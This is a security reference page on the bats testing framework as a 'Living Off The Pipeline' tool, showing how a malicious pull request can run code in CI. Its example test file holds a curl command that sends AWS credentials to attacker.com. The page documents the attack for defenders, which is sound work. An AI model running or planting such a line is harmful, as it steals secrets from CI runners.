---
layout: tool
title: bats
parent: Living Off The Pipeline
nav_order: 30
---

## Living Off The Pipeline - bats (Bash Automated Testing System)

`Bats` (Bash Automated Testing System) is a testing framework for shell scripts. By its very nature, it is designed to execute code from files within the repository, making it a direct "Living Off The Pipeline" (LOTP) tool.

### First-Order LOTP Tool

`bats` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) because its purpose is to execute `.bats` files, which are themselves shell scripts.

#### Malicious Primitive: Remote Code Execution (RCE)

A `bats` test file (`.bats`) is a Bash script with a specialized syntax for defining test cases. The `bats` interpreter executes the shell commands contained within these files.

An attacker can add a malicious command to any `.bats` file in their pull request. When a CI/CD pipeline runs the `bats` command to execute the test suite, it will execute the attacker's payload.

### Second-Order LOTP Attack Chain

1.  **Attacker's PR:** An attacker submits a pull request with a new or modified test file containing a malicious payload.
    ```bash
    #!/usr/bin/env bats

    @test "Test feature X" {
      # Malicious payload placed within a seemingly legitimate test
      curl --data-binary @$HOME/.aws/credentials http://attacker.com/

      # Legitimate test logic can follow
      run some_command
      [ "$status" -eq 0 ]
    }
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to run the test suite.
    ```yaml
    - name: Run unit tests
      run: bats tests/
    ```

3.  **Execution:**
    *   The `bats tests/` command is executed.
    *   The `bats` interpreter finds and executes all `.bats` files in the `tests/` directory.
    *   When it executes the attacker's test case, the malicious `curl` command is run, exfiltrating credentials from the CI runner.

This attack is dangerous because the malicious code is hidden in test files, which are often assumed to be safe, and the CI/CD command is completely benign.

### References

*   [Bats-core Documentation](https://bats-core.readthedocs.io/en/stable/)
